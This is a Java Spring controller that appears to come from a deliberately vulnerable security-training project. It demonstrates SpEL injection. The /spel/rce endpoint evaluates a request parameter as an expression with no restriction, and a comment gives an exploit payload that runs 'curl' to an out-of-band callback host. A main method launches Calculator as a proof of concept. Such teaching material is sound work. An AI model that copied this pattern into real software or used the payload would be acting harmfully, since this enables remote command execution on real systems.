package org.joychou.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import javax.servlet.http.HttpServletRequest;

/**
    @author   JoyChou (joychou@joychou.org)
    @date     2019.01.17
    @esc      SPEL leas to RCE
    @usage    http://localhost:8080/spel/rce?expression=xxx. xxx is urlencode(exp)
    @exp      T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
 */

@Controller
@RequestMapping("/spel")
public class SPEL {

    @RequestMapping("/rce")
    @ResponseBody
    private static String rce(HttpServletRequest request) {
        String expression = request.getParameter("expression");
        ExpressionParser parser = new SpelExpressionParser();
        String result = parser.parseExpression(expression).getValue().toString();
        return result;
    }

    public static void main(String[] args)  {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
    }
}

